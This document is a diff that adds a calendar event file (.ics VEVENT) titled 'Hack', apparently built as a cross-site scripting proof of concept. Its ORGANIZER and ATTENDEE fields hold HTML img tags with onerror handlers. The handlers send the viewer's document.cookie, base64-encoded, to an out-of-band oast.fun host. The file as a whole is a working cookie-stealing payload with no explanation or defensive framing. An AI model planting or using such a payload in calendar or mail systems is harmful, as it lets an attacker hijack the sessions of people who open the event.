@@ -1,0 +1,18 @@
+BEGIN: VEVENT
+CREATED: 20260319T190656
+LAST-MODIFIED: 20260319T190656
+DTSTAMP: 20260319T190656
+UID: 20260319T190656-8f7a0562@biduhygiknnyfdmkcndynlpbz0cmr3lea.oast.fun
+SEQUENCE: 2
+SUMMARY: Hack
+TRANSP: OPAQUE
+DTSTART;TZID=Asia/Singapore: 20260320T193000
+DTEND;TZID=Asia/Singapore: 20260320T203000
+DESCRIPTION: Hack
+LOCATION: Hack
+ORGANIZER;PARTSTAT=ACCEPTED;ROLE=CHAIR:mailto:
+ <img src="x" onerror='fetch("https://biduhygiknnyfdmkcndynlpbz0cmr3lea.oast.fun/"+btoa(document.cookie))'>
+ @test.local
+ATTENDEE;RSVP=TRUE;PARTSTAT=NEEDS-ACTION;ROLE=REQ-PARTICIPANT:mailto:
+ <img src="x" onerror='fetch("https://biduhygiknnyfdmkcndynlpbz0cmr3lea.oast.fun/"+btoa(document.cookie))'>
+END:VEVENT
